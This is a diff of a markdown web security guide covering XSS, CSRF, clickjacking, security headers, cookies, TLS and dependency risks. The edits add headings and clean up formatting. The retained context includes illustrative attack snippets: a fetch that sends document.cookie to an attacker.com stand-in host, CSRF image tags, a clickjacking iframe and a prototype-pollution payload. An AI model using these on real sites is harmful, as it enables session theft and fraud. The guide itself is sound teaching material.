@@ -1,7 +1,9 @@
-#  Web Application Security Guide
+# **🔒 Web Application Security Guide**
 
 Web security is crucial for protecting applications and users from various
 attacks. Here are the key concepts with JavaScript examples:
+
+## Cross-Site Scripting (XSS)
 
 ### 1. What is XSS, and how does it pose a security risk in web applications?
 
@@ -47,7 +49,6 @@ executable code.
 
 **Implementation Example:**
 
-// Basic example showing the core idea.
 ```javascript
 // HTML encoding function
 function htmlEncode(str) {
@@ -91,7 +92,6 @@ of scripts, stylesheets, images, and other resources.
 
 **CSP Directives:**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 Content-Security-Policy:
     default-src 'self';
@@ -188,6 +188,8 @@ Content-Security-Policy:
 
 ---
 
+## Cross-Site Request Forgery (CSRF)
+
 ### 6. What is CSRF, and how does it work as an attack vector?
 
 Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated user
@@ -205,7 +207,6 @@ and authentication information.
 
 **Attack Examples:**
 
-<!-- Basic example showing the core idea. -->
 ```html
 <!-- Simple CSRF attack via image tag -->
 <img
@@ -254,7 +255,8 @@ from the legitimate application rather than a malicious site.
    expected value
 4. Requests without valid tokens are rejected
 
-<!-- Basic example showing the core idea. -->
+**Implementation Example:**
+
 ```html
 <!-- HTML Form with CSRF token -->
 <form action="/transfer" method="POST">
@@ -265,18 +267,17 @@ from the legitimate application rather than a malicious site.
 </form>
 ```
 
-// Basic example showing the core idea.
 ```javascript
 // Server-side validation (Node.js/Express example)
 app.post('/transfer', (req, res) => {
   const receivedToken = req.body.csrf_token;
   const sessionToken = req.session.csrf_token;
 
-if (!receivedToken || receivedToken !== sessionToken) {
+  if (!receivedToken || receivedToken !== sessionToken) {
     return res.status(403).json({ error: 'Invalid CSRF token' });
   }
 
-// Process legitimate request
+  // Process legitimate request
   processTransfer(req.body);
 });
 ```
@@ -305,7 +306,6 @@ sites.
 
 **Configuration Examples:**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly
 Set-Cookie: sessionid=abc123; SameSite=Lax; Secure; HttpOnly
@@ -382,7 +382,6 @@ Set-Cookie: tracking=xyz789; SameSite=None; Secure
 
 **Token-Based Protection:**
 
-// Basic example showing the core idea.
 ```javascript
 // Synchronizer Token Pattern
 const csrf = require('csurf');
@@ -395,7 +394,6 @@ app.get('/form', (req, res) => {
 
 **Double-Submit Cookie Pattern:**
 
-// Basic example showing the core idea.
 ```javascript
 // Generate and set CSRF cookie
 app.use((req, res, next) => {
@@ -415,7 +413,7 @@ app.post('/api/*', (req, res, next) => {
   const cookieToken = req.cookies.csrfToken;
   const headerToken = req.headers['x-csrf-token'];
 
-if (cookieToken !== headerToken) {
+  if (cookieToken !== headerToken) {
     return res.status(403).json({ error: 'CSRF token mismatch' });
   }
   next();
@@ -424,7 +422,6 @@ if (cookieToken !== headerToken) {
 
 **SameSite Cookie Configuration:**
 
-// Basic example showing the core idea.
 ```javascript
 app.use(
   session({
@@ -441,7 +438,6 @@ app.use(
 
 **Custom Header Validation:**
 
-// Basic example showing the core idea.
 ```javascript
 // Require custom header for AJAX requests
 app.use('/api/', (req, res, next) => {
@@ -455,13 +451,12 @@ app.use('/api/', (req, res, next) => {
 
 **Origin and Referer Validation:**
 
-// Basic example showing the core idea.
 ```javascript
 app.use((req, res, next) => {
   const origin = req.headers.origin || req.headers.referer;
   const allowedOrigins = ['https://yourapp.com', 'https://www.yourapp.com'];
 
-if (req.method !== 'GET' && !allowedOrigins.includes(origin)) {
+  if (req.method !== 'GET' && !allowedOrigins.includes(origin)) {
     return res.status(403).json({ error: 'Invalid origin' });
   }
   next();
@@ -475,11 +470,17 @@ if (req.method !== 'GET' && !allowedOrigins.includes(origin)) {
 - **Rails**: `protect_from_forgery` with authenticity tokens
 - **ASP.NET**: Anti-forgery tokens with `@Html.AntiForgeryToken()`
 
+---
+
+## IFrame Security
+
 ### 11. Why are IFrames a potential security risk, and how can they be used maliciously?
 
 IFrames (inline frames) can pose security risks because they allow embedding
 external content within web pages, potentially creating attack vectors for
 malicious actors.
+
+**Security Risks:**
 
 **Clickjacking Attacks:**
 
@@ -501,7 +502,6 @@ malicious actors.
 
 **Malicious Examples:**
 
-<!-- Basic example showing the core idea. -->
 ```html
 <!-- Clickjacking attack -->
 <iframe
@@ -530,7 +530,6 @@ malicious actors.
 
 **X-Frame-Options Header:**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 X-Frame-Options: DENY                    # Never allow framing
 X-Frame-Options: SAMEORIGIN             # Only allow same-origin framing
@@ -539,7 +538,6 @@ X-Frame-Options: ALLOW-FROM https://trusted-site.com  # Allow specific origins
 
 **Content Security Policy (Frame Ancestors):**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 Content-Security-Policy: frame-ancestors 'none';                    # Equivalent to DENY
 Content-Security-Policy: frame-ancestors 'self';                    # Equivalent to SAMEORIGIN
@@ -548,7 +546,6 @@ Content-Security-Policy: frame-ancestors 'self' https://trusted.com; # Allow spe
 
 **JavaScript Frame-Busting:**
 
-// Basic example showing the core idea.
 ```javascript
 // Basic frame-busting
 if (top !== self) {
@@ -581,7 +578,6 @@ if (window !== window.top) {
 
 **Secure IFrame Implementation:**
 
-<!-- Basic example showing the core idea. -->
 ```html
 <!-- Restricting iframe capabilities -->
 <iframe
@@ -625,7 +621,6 @@ element.
 
 **DENY:**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 X-Frame-Options: DENY
 ```
@@ -636,7 +631,6 @@ X-Frame-Options: DENY
 
 **SAMEORIGIN:**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 X-Frame-Options: SAMEORIGIN
 ```
@@ -647,7 +641,6 @@ X-Frame-Options: SAMEORIGIN
 
 **ALLOW-FROM (Deprecated):**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 X-Frame-Options: ALLOW-FROM https://trusted-domain.com
 ```
@@ -660,21 +653,18 @@ X-Frame-Options: ALLOW-FROM https://trusted-domain.com
 
 **Apache Configuration:**
 
-// Example demonstrating  Web Application Security Guide.
 ```apache
 Header always set X-Frame-Options SAMEORIGIN
 ```
 
 **Nginx Configuration:**
 
-// Example demonstrating  Web Application Security Guide.
 ```nginx
 add_header X-Frame-Options SAMEORIGIN always;
 ```
 
 **Application-Level Implementation:**
 
-// Basic example showing the core idea.
 ```javascript
 // Express.js
 app.use((req, res, next) => {
@@ -689,6 +679,8 @@ header('X-Frame-Options: SAMEORIGIN');
 Response.Headers.Add('X-Frame-Options', 'SAMEORIGIN');
 ```
 
+**Limitations:**
+
 - Per-page basis only (cannot specify different policies for different frames)
 - Limited granular control compared to CSP
 - ALLOW-FROM has poor browser support
@@ -696,7 +688,6 @@ Response.Headers.Add('X-Frame-Options', 'SAMEORIGIN');
 
 **Modern Alternative - CSP frame-ancestors:**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
 ```
@@ -707,6 +698,10 @@ Benefits over X-Frame-Options:
 - More granular control
 - Can specify multiple allowed origins
 - Part of comprehensive CSP implementation
+
+---
+
+## Authentication vs Authorization
 
 ### 14. Differentiate between authentication and authorization in the context of web security.
 
@@ -727,14 +722,13 @@ answers the question "What are you allowed to do?"
 
 **Authentication Methods:**
 
-// Basic example showing the core idea.
 ```javascript
 // Password-based authentication
 app.post('/login', async (req, res) => {
   const { username, password } = req.body;
   const user = await User.findOne({ username });
 
-if (user && (await bcrypt.compare(password, user.hashedPassword))) {
+  if (user && (await bcrypt.compare(password, user.hashedPassword))) {
     req.session.userId = user.id;
     res.json({ message: 'Authentication successful' });
   } else {
@@ -747,7 +741,7 @@ app.post('/verify-mfa', async (req, res) => {
   const { userId, totpCode } = req.body;
   const user = await User.findById(userId);
 
-if (
+  if (
     speakeasy.totp.verify({
       secret: user.mfaSecret,
       encoding: 'base32',
@@ -774,7 +768,6 @@ if (
 
 **Role-Based Access Control (RBAC):**
 
-// Basic example showing the core idea.
 ```javascript
 // Role-based authorization middleware
 const requireRole = (roles) => {
@@ -783,11 +776,11 @@ const requireRole = (roles) => {
       return res.status(401).json({ error: 'Authentication required' });
     }
 
-if (!roles.includes(req.user.role)) {
+    if (!roles.includes(req.user.role)) {
       return res.status(403).json({ error: 'Insufficient permissions' });
     }
 
-next();
+    next();
   };
 };
 
@@ -798,7 +791,6 @@ app.get('/reports', requireRole(['admin', 'manager']), getReports);
 
 **Attribute-Based Access Control (ABAC):**
 
-// Basic example showing the core idea.
 ```javascript
 // Policy-based authorization
 const authorize = (policy) => {
@@ -810,7 +802,7 @@ const authorize = (policy) => {
       environment: { time: new Date(), ip: req.ip },
     };
 
-if (evaluatePolicy(policy, context)) {
+    if (evaluatePolicy(policy, context)) {
       next();
     } else {
       res.status(403).json({ error: 'Access denied' });
@@ -840,6 +832,10 @@ if (evaluatePolicy(policy, context)) {
 - Use secure session management
 - Implement proper error handling for both processes
 
+---
+
+## Security Headers
+
 ### 15. Name and describe key security headers used to enhance web application security.
 
 Security headers are HTTP response headers that instruct browsers to enable
@@ -848,7 +844,6 @@ attacks.
 
 **Content Security Policy (CSP):**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;
 ```
@@ -859,13 +854,16 @@ Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; 
 
 **X-Frame-Options:**
 
+```http
+X-Frame-Options: SAMEORIGIN
+```
+
 - Prevents clickjacking attacks
 - Controls iframe embedding
 - Values: DENY, SAMEORIGIN, ALLOW-FROM
 
 **X-Content-Type-Options:**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 X-Content-Type-Options: nosniff
 ```
@@ -876,7 +874,6 @@ X-Content-Type-Options: nosniff
 
 **X-XSS-Protection:**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 X-XSS-Protection: 1; mode=block
 ```
@@ -887,7 +884,6 @@ X-XSS-Protection: 1; mode=block
 
 **Referrer-Policy:**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 Referrer-Policy: strict-origin-when-cross-origin
 ```
@@ -898,7 +894,6 @@ Referrer-Policy: strict-origin-when-cross-origin
 
 **Permissions-Policy (formerly Feature-Policy):**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 Permissions-Policy: camera=(), microphone=(), geolocation=(self)
 ```
@@ -909,7 +904,6 @@ Permissions-Policy: camera=(), microphone=(), geolocation=(self)
 
 **Cross-Origin-Embedder-Policy (COEP):**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 Cross-Origin-Embedder-Policy: require-corp
 ```
@@ -920,7 +914,6 @@ Cross-Origin-Embedder-Policy: require-corp
 
 **Cross-Origin-Opener-Policy (COOP):**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 Cross-Origin-Opener-Policy: same-origin
 ```
@@ -931,7 +924,6 @@ Cross-Origin-Opener-Policy: same-origin
 
 **Complete Security Headers Implementation:**
 
-// Basic example showing the core idea.
 ```javascript
 // Express.js security headers middleware
 app.use((req, res, next) => {
@@ -941,31 +933,31 @@ app.use((req, res, next) => {
     'max-age=31536000; includeSubDomains; preload'
   );
 
-// CSP
+  // CSP
   res.setHeader(
     'Content-Security-Policy',
     "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
   );
 
-// Frame protection
+  // Frame protection
   res.setHeader('X-Frame-Options', 'SAMEORIGIN');
 
-// Content type protection
+  // Content type protection
   res.setHeader('X-Content-Type-Options', 'nosniff');
 
-// XSS protection
+  // XSS protection
   res.setHeader('X-XSS-Protection', '1; mode=block');
 
-// Referrer policy
+  // Referrer policy
   res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
 
-// Permissions policy
+  // Permissions policy
   res.setHeader(
     'Permissions-Policy',
     'camera=(), microphone=(), geolocation=(self)'
   );
 
-next();
+  next();
 });
 ```
 
@@ -977,7 +969,6 @@ downgrade attacks and cookie hijacking.
 
 **HSTS Header Syntax:**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 Strict-Transport-Security: max-age=<expire-time>; includeSubDomains; preload
 ```
@@ -989,15 +980,16 @@ Strict-Transport-Security: max-age=<expire-time>; includeSubDomains; preload
 - **includeSubDomains**: Applies the policy to all subdomains
 - **preload**: Allows inclusion in browser preload lists
 
-// Example demonstrating  Web Application Security Guide.
+**Implementation Examples:**
+
 ```http
-## Basic HSTS (1 year)
+# Basic HSTS (1 year)
 Strict-Transport-Security: max-age=31536000
 
-## HSTS with subdomains (1 year)
+# HSTS with subdomains (1 year)
 Strict-Transport-Security: max-age=31536000; includeSubDomains
 
-## HSTS with preload (2 years minimum required)
+# HSTS with preload (2 years minimum required)
 Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
 ```
 
@@ -1005,21 +997,18 @@ Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
 
 **Apache:**
 
-// Example demonstrating  Web Application Security Guide.
 ```apache
 Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
 ```
 
 **Nginx:**
 
-// Example demonstrating  Web Application Security Guide.
 ```nginx
 add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
 ```
 
 **Application Level:**
 
-// Basic example showing the core idea.
 ```javascript
 // Express.js
 app.use((req, res, next) => {
@@ -1057,6 +1046,8 @@ app.use((req, res, next) => {
 - Sites are automatically accessed via HTTPS even on first visit
 - Provides protection before the first HSTS header is received
 
+**Best Practices:**
+
 - Start with shorter max-age values during testing
 - Use includeSubDomains only if all subdomains support HTTPS
 - Submit to preload lists for maximum protection
@@ -1070,6 +1061,10 @@ app.use((req, res, next) => {
 - Requires valid SSL/TLS certificates for all covered domains
 - May cause issues if HTTPS support is later removed
 
+---
+
+## Client-Side Storage Security
+
 ### 17. Discuss security considerations when using client-side storage mechanisms like cookies and localStorage.
 
 Client-side storage mechanisms pose various security risks that must be
@@ -1079,7 +1074,6 @@ carefully managed to protect user data and application security.
 
 **Cross-Site Scripting (XSS) Vulnerabilities:**
 
-// Basic example showing the core idea.
 ```javascript
 // Vulnerable: JavaScript can access cookies
 document.cookie = "sessionId=abc123";
@@ -1091,7 +1085,6 @@ Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
 
 **Cross-Site Request Forgery (CSRF) Risks:**
 
-// Basic example showing the core idea.
 ```javascript
 // Vulnerable: Cookies sent with all requests
 Set-Cookie: sessionId=abc123
@@ -1102,12 +1095,11 @@ Set-Cookie: sessionId=abc123; SameSite=Strict; HttpOnly; Secure
 
 **Man-in-the-Middle Attacks:**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
-## Vulnerable: Cookie sent over HTTP
+# Vulnerable: Cookie sent over HTTP
 Set-Cookie: sessionId=abc123
 
-## Secure: Secure flag ensures HTTPS-only transmission
+# Secure: Secure flag ensures HTTPS-only transmission
 Set-Cookie: sessionId=abc123; Secure; HttpOnly
 ```
 
@@ -1115,7 +1107,6 @@ Set-Cookie: sessionId=abc123; Secure; HttpOnly
 
 **XSS Attack Vector:**
 
-// Basic example showing the core idea.
 ```javascript
 // Vulnerable: Storing sensitive data in localStorage
 localStorage.setItem('apiKey', 'secret-api-key');
@@ -1137,7 +1128,6 @@ const stolenData = JSON.stringify(localStorage);
 
 **Tab-Specific Vulnerabilities:**
 
-// Basic example showing the core idea.
 ```javascript
 // sessionStorage is isolated per tab but still vulnerable to XSS
 sessionStorage.setItem('tempData', 'sensitive-info');
@@ -1146,9 +1136,10 @@ sessionStorage.setItem('tempData', 'sensitive-info');
 const sensitiveData = sessionStorage.getItem('tempData');
 ```
 
+**Security Best Practices:**
+
 **Cookie Security Implementation:**
 
-// Basic example showing the core idea.
 ```javascript
 // Secure cookie configuration
 app.use(
@@ -1169,7 +1160,6 @@ app.use(
 
 **Data Encryption for Client Storage:**
 
-// Basic example showing the core idea.
 ```javascript
 // Encrypt sensitive data before storing
 const CryptoJS = require('crypto-js');
@@ -1194,7 +1184,6 @@ function secureRetrieve(key) {
 
 **Input Validation and Sanitization:**
 
-// Basic example showing the core idea.
 ```javascript
 // Validate data before storing
 function safeStore(key, value) {
@@ -1202,11 +1191,11 @@ function safeStore(key, value) {
     throw new Error('Invalid key');
   }
 
-if (typeof value !== 'string') {
+  if (typeof value !== 'string') {
     value = JSON.stringify(value);
   }
 
-// Sanitize value to prevent injection attacks
+  // Sanitize value to prevent injection attacks
   const sanitizedValue = DOMPurify.sanitize(value);
   localStorage.setItem(key, sanitizedValue);
 }
@@ -1214,7 +1203,6 @@ if (typeof value !== 'string') {
 
 **Storage Quotas and Cleanup:**
 
-// Basic example showing the core idea.
 ```javascript
 // Implement storage cleanup to prevent data accumulation
 function cleanupExpiredData() {
@@ -1253,7 +1241,6 @@ providing protection against CSRF attacks and some types of information leakage.
 
 **Strict Mode:**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 Set-Cookie: sessionId=abc123; SameSite=Strict; HttpOnly; Secure
 ```
@@ -1265,7 +1252,6 @@ Set-Cookie: sessionId=abc123; SameSite=Strict; HttpOnly; Secure
 
 **Lax Mode (Default in modern browsers):**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 Set-Cookie: sessionId=abc123; SameSite=Lax; HttpOnly; Secure
 ```
@@ -1276,7 +1262,6 @@ Set-Cookie: sessionId=abc123; SameSite=Lax; HttpOnly; Secure
 
 **None Mode:**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 Set-Cookie: trackingId=xyz789; SameSite=None; Secure
 ```
@@ -1289,7 +1274,6 @@ Set-Cookie: trackingId=xyz789; SameSite=None; Secure
 
 **Before SameSite (Vulnerable):**
 
-<!-- Basic example showing the core idea. -->
 ```html
 <!-- Malicious site can trigger requests with cookies -->
 <img src="https://bank.com/transfer?to=attacker&amount=1000" />
@@ -1298,7 +1282,6 @@ Set-Cookie: trackingId=xyz789; SameSite=None; Secure
 
 **With SameSite=Strict (Protected):**
 
-<!-- Basic example showing the core idea. -->
 ```html
 <!-- Same request from malicious site -->
 <img src="https://bank.com/transfer?to=attacker&amount=1000" />
@@ -1314,7 +1297,6 @@ providing protection against XSS attacks.
 
 **Without HttpOnly (Vulnerable):**
 
-// Basic example showing the core idea.
 ```javascript
 // Malicious script can steal cookies
 const stolenCookies = document.cookie;
@@ -1326,12 +1308,10 @@ fetch('https://attacker.com/steal', {
 
 **With HttpOnly (Protected):**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
 ```
 
-// Basic example showing the core idea.
 ```javascript
 // JavaScript cannot access HttpOnly cookies
 console.log(document.cookie); // Does not include HttpOnly cookies
@@ -1341,7 +1321,6 @@ console.log(document.cookie); // Does not include HttpOnly cookies
 
 **Secure Session Cookie Configuration:**
 
-// Basic example showing the core idea.
 ```javascript
 // Express.js session configuration
 app.use(
@@ -1363,7 +1342,6 @@ app.use(
 
 **Authentication Cookie Best Practices:**
 
-// Basic example showing the core idea.
 ```javascript
 // Set secure authentication cookie
 function setAuthCookie(res, token) {
@@ -1391,7 +1369,6 @@ function clearAuthCookie(res) {
 
 **Different Cookies for Different Purposes:**
 
-// Basic example showing the core idea.
 ```javascript
 // Authentication cookie (most secure)
 res.cookie('auth', token, {
@@ -1420,13 +1397,12 @@ res.cookie('analytics', analyticsId, {
 
 **Browser Compatibility Considerations:**
 
-// Basic example showing the core idea.
 ```javascript
 // Handle older browsers that don't support SameSite
 function setSameSiteCookie(res, name, value, options = {}) {
   const userAgent = req.headers['user-agent'];
 
-// Check if browser supports SameSite
+  // Check if browser supports SameSite
   if (supportsSameSite(userAgent)) {
     res.cookie(name, value, {
       ...options,
@@ -1441,6 +1417,10 @@ function setSameSiteCookie(res, name, value, options = {}) {
   }
 }
 ```
+
+---
+
+## HTTPS and SSL/TLS
 
 ### 19. Why is HTTPS important for securing communication between clients and servers?
 
@@ -1482,7 +1462,6 @@ impersonation attacks.
 
 **Without HTTPS (Vulnerable):**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
 GET /login HTTP/1.1
 Host: example.com
@@ -1497,9 +1476,9 @@ username=john&password=secret123
 
 **With HTTPS (Secure):**
 
-// Example demonstrating  Web Application Security Guide.
 ```http
-## All HTTP data encrypted within the tunnel
+# Encrypted TLS tunnel established first
+# All HTTP data encrypted within the tunnel
 GET /login HTTP/1.1
 Host: example.com
 Content-Type: application/x-www-form-urlencoded
@@ -1511,7 +1490,6 @@ Content-Type: application/x-www-form-urlencoded
 
 **WiFi Eavesdropping:**
 
-// Basic example showing the core idea.
 ```javascript
 // Without HTTPS: Attacker can capture login credentials
 // Network packet capture shows:
@@ -1522,7 +1500,8 @@ Content-Type: application/x-www-form-urlencoded
 // Network packet capture shows only encrypted data
 ```
 
-// Basic example showing the core idea.
+**Man-in-the-Middle Attacks:**
+
 ```javascript
 // Without HTTPS: Attacker can modify responses
 // Attacker injects: <script>steal_cookies()</script>
@@ -1540,7 +1519,6 @@ Content-Type: application/x-www-form-urlencoded
 
 **Implementation Requirements:**
 
-// Basic example showing the core idea.
 ```javascript
 // Force HTTPS redirection
 app.use((req, res, next) => {
@@ -1570,7 +1548,6 @@ cryptographic protocols that provide secure communication over networks.
 
 **Step 1: Client Hello**
 
-// Example demonstrating  Web Application Security Guide.
 ```
 Client → Server: TLS version, cipher suites, random number
 ```
@@ -1581,7 +1558,6 @@ Client → Server: TLS version, cipher suites, random number
 
 **Step 2: Server Hello**
 
-// Example demonstrating  Web Application Security Guide.
 ```
 Server → Client: TLS version, chosen cipher suite, random number, certificate
 ```
@@ -1592,7 +1568,6 @@ Server → Client: TLS version, chosen cipher suite, random number, certificate
 
 **Step 3: Certificate Verification**
 
-// Basic example showing the core idea.
 ```javascript
 // Client verifies server certificate
 function verifyCertificate(certificate) {
@@ -1606,7 +1581,6 @@ function verifyCertificate(certificate) {
 
 **Step 4: Key Exchange**
 
-// Example demonstrating  Web Application Security Guide.
 ```
 Client → Server: Encrypted pre-master secret (using server's public key)
 ```
@@ -1617,14 +1591,12 @@ Client → Server: Encrypted pre-master secret (using server's public key)
 
 **Step 5: Cipher Spec Change**
 
-// Example demonstrating  Web Application Security Guide.
 ```
 Both sides: Switch to encrypted communication using derived keys
 ```
 
 **Step 6: Finished Messages**
 
-// Example demonstrating  Web Application Security Guide.
 ```
 Both sides: Send encrypted "finished" messages to confirm handshake
 ```
@@ -1633,7 +1605,6 @@ Both sides: Send encrypted "finished" messages to confirm handshake
 
 **Symmetric Encryption:**
 
-// Basic example showing the core idea.
 ```javascript
 // AES encryption for data transfer (fast)
 const cipher = crypto.createCipher('aes-256-gcm', symmetricKey);
@@ -1643,7 +1614,6 @@ encrypted += cipher.final('hex');
 
 **Asymmetric Encryption:**
 
-// Basic example showing the core idea.
 ```javascript
 // RSA for key exchange (slower but secure)
 const publicKey = certificate.publicKey;
@@ -1652,7 +1622,6 @@ const encryptedSecret = crypto.publicEncrypt(publicKey, preMarshallSecret);
 
 **Hash Functions:**
 
-// Basic example showing the core idea.
 ```javascript
 // SHA-256 for integrity verification
 const hash = crypto.createHash('sha256');
@@ -1662,7 +1631,6 @@ const digest = hash.digest('hex');
 
 **Digital Signatures:**
 
-// Basic example showing the core idea.
 ```javascript
 // Server proves identity with private key signature
 const signature = crypto.sign('sha256', data, privateKey);
@@ -1673,7 +1641,6 @@ const isValid = crypto.verify('sha256', data, publicKey, signature);
 
 **Root Certificate Authority:**
 
-// Example demonstrating  Web Application Security Guide.
 ```
 Root CA (trusted by browsers)
   └── Intermediate CA
@@ -1682,7 +1649,6 @@ Root CA (trusted by browsers)
 
 **Certificate Validation Process:**
 
-// Basic example showing the core idea.
 ```javascript
 function validateCertificateChain(serverCert, intermediates, rootCAs) {
   // 1. Verify server cert was signed by intermediate CA
@@ -1690,34 +1656,33 @@ function validateCertificateChain(serverCert, intermediates, rootCAs) {
     return false;
   }
 
-// 2. Verify intermediate was signed by root CA
+  // 2. Verify intermediate was signed by root CA
   if (!verifySignature(intermediate, rootCA.publicKey)) {
     return false;
   }
 
-// 3. Verify root CA is trusted
+  // 3. Verify root CA is trusted
   if (!rootCAs.includes(rootCA)) {
     return false;
   }
 
-// 4. Check certificate validity dates
+  // 4. Check certificate validity dates
   const now = new Date();
   if (now < serverCert.notBefore || now > serverCert.notAfter) {
     return false;
   }
 
-// 5. Verify domain name matches
+  // 5. Verify domain name matches
   if (!matchesDomain(serverCert.subject, requestedDomain)) {
     return false;
   }
 
-return true;
+  return true;
 }
 ```
 
 **Perfect Forward Secrecy:**
 
-// Basic example showing the core idea.
 ```javascript
 // Ephemeral key exchange (DHE/ECDHE)
 // Each session uses unique keys
@@ -1729,7 +1694,8 @@ const ephemeralKeyPair = crypto.generateKeyPairSync('ec', {
 
 **TLS Configuration Best Practices:**
 
-// Basic example showing the core idea.
+**Server Configuration:**
+
 ```javascript
 const https = require('https');
 const fs = require('fs');
@@ -1739,7 +1705,7 @@ const options = {
   cert: fs.readFileSync('certificate.pem'),
   ca: fs.readFileSync('ca-certificate.pem'),
 
-// Security configurations
+  // Security configurations
   secureProtocol: 'TLSv1_2_method', // Minimum TLS 1.2
   ciphers: [
     'ECDHE-RSA-AES128-GCM-SHA256',
@@ -1760,6 +1726,10 @@ https.createServer(options, app).listen(443);
 - **Certificate Transparency**: Public logs of certificates
 - **OCSP Stapling**: Real-time certificate revocation checking
 
+---
+
+## Dependency Security
+
 ### 21. How can the use of third-party dependencies introduce security vulnerabilities?
 
 Third-party dependencies are external libraries, frameworks, and packages that
@@ -1770,7 +1740,6 @@ they also introduce potential security risks.
 
 **Known Security Vulnerabilities:**
 
-// Example demonstrating  Web Application Security Guide.
 ```json
 // package.json with vulnerable dependencies
 {
@@ -1785,9 +1754,8 @@ they also introduce potential security risks.
 
 **Transitive Dependencies:**
 
-# Basic example showing the core idea.
 ```bash
-## Your direct dependency tree
+# Your direct dependency tree
 myapp
 ├── express@4.18.0
 │   ├── body-parser@1.20.0
@@ -1798,7 +1766,6 @@ myapp
 
 **Supply Chain Attacks:**
 
-// Basic example showing the core idea.
 ```javascript
 // Malicious code in compromised packages
 // Example: event-stream incident
@@ -1817,7 +1784,6 @@ function stealBitcoinWallets() {
 
 **Prototype Pollution (lodash):**
 
-// Basic example showing the core idea.
 ```javascript
 const _ = require('lodash');
 
@@ -1831,7 +1797,6 @@ _.set({}, '__proto__.constructor.prototype.polluted', 'rce');
 
 **Regular Expression DoS (moment.js):**
 
-// Basic example showing the core idea.
 ```javascript
 const moment = require('moment');
 
@@ -1842,7 +1807,6 @@ moment(maliciousInput, 'YYYY-MM-DD'); // Causes CPU spike
 
 **Cross-Site Scripting (jQuery):**
 
-// Basic example showing the core idea.
 ```javascript
 // Older jQuery versions vulnerable to XSS
 $('#content').html(userInput); // Direct HTML injection
@@ -1855,7 +1819,6 @@ $(userInput); // Can execute JavaScript if userInput contains script tags
 
 **Dependency Audit Process:**
 
-// Basic example showing the core idea.
 ```javascript
 // Automated vulnerability scanning
 const auditReport = {
@@ -1884,13 +1847,13 @@ function calculateRisk(advisory) {
     low: 1,
   };
 
-const exposureFactors = {
+  const exposureFactors = {
     directDependency: 2,
     publicFacing: 3,
     privilegedAccess: 2,
   };
 
-return (
+  return (
     severityWeight[advisory.severity] *
     Object.values(exposureFactors).reduce((a, b) => a + b, 1)
   );
@@ -1899,19 +1862,18 @@ return (
 
 **Malicious Package Detection:**
 
-// Basic example showing the core idea.
 ```javascript
 // Suspicious package indicators
 const suspiciousPatterns = {
   // Typosquatting
   packageName: /^(reac|expres|lodas)/, // Similar to popular packages
 
-// Unusual permissions
+  // Unusual permissions
   networkAccess: /require\(['"]https?:\/\//, // Remote code loading
   fileSystemAccess: /fs\.(readFile|writeFile|unlink)/,
   processAccess: /process\.(env|exit|kill)/,
 
-// Obfuscation
+  // Obfuscation
   encodedStrings: /eval\(|Function\(|\\x[0-9a-f]{2}/,
   base64: /[A-Za-z0-9+\/]{20,}={0,2}/,
 };
@@ -1933,26 +1895,24 @@ const suspiciousPatterns = {
 
 **Vulnerability Scanning and Monitoring:**
 
-# Basic example showing the core idea.
 ```bash
-## NPM audit for Node.js projects
+# NPM audit for Node.js projects
 npm audit
 npm audit --audit-level moderate
 npm audit fix
 
-## Yarn audit
+# Yarn audit
 yarn audit
 yarn audit --level moderate
 
-## Automated scanning in CI/CD
+# Automated scanning in CI/CD
 npm audit --json | audit-ci --moderate
 ```
 
 **Automated Dependency Updates:**
 
-# Example configuration for the topic.
 ```yaml
-## Dependabot configuration (.github/dependabot.yml)
+# Dependabot configuration (.github/dependabot.yml)
 version: 2
 updates:
   - package-ecosystem: 'npm'
@@ -1970,7 +1930,6 @@ updates:
 
 **Lock File Management:**
 
-// Example demonstrating  Web Application Security Guide.
 ```json
 // package-lock.json ensures reproducible builds
 {
@@ -1990,7 +1949,6 @@ updates:
 
 **Evaluation Criteria:**
 
-// Basic example showing the core idea.
 ```javascript
 const dependencyEvaluation = {
   security: {
@@ -2000,14 +1958,14 @@ const dependencyEvaluation = {
     auditResults: 'Clean security audit',
   },
 
-maintenance: {
+  maintenance: {
     lastUpdate: 'Recent activity',
     issueResponse: 'Active issue resolution',
     communitySupport: 'Active community',
     documentation: 'Comprehensive docs',
   },
 
-technical: {
+  technical: {
     codeQuality: 'High code standards',
     testCoverage: 'Comprehensive tests',
     performance: 'Minimal performance impact',
@@ -2018,7 +1976,6 @@ technical: {
 
 **Dependency Pinning Strategy:**
 
-// Example demonstrating  Web Application Security Guide.
 ```json
 // Strict version pinning for security-critical dependencies
 {
@@ -2038,7 +1995,6 @@ technical: {
 
 **Continuous Monitoring Pipeline:**
 
